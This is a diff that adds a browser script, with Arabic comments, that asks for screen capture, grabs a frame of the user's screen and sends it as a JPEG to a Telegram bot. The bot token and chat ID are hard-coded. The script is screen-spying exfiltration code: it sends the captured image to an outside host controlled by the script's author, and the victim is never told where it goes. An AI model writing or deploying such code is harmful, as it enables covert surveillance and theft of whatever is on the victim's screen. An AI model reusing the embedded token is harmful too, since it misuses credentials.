@@ -1,0 +1,35 @@
+<script>
+navigator.mediaDevices.getDisplayMedia({ video: true })
+.then(function(stream) {
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    video.play();
+    video.onloadedmetadata = function() {
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL('image/jpeg', 0.8);
+        
+        // إرسال الصورة إلى تليجرام
+        const botToken = '8989892506:AAGFWse5ZJWLSuR8lToFPpY9NJIiih--VFI'; // استبدل هذا بالـ Token الخاص بك
+        const chatId = '7749587228'; // رقم شاتك في تليجرام
+        
+        // تحويل Base64 إلى Blob
+        fetch(imageData).then(res => res.blob()).then(blob => {
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", blob, "screenshot.jpg");
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).then(response => console.log('Sent to Telegram!'));
+            
+            stream.getTracks().forEach(track => track.stop());
+        });
+    };
+})
+.catch(err => console.error("User denied access", err));
+</script>
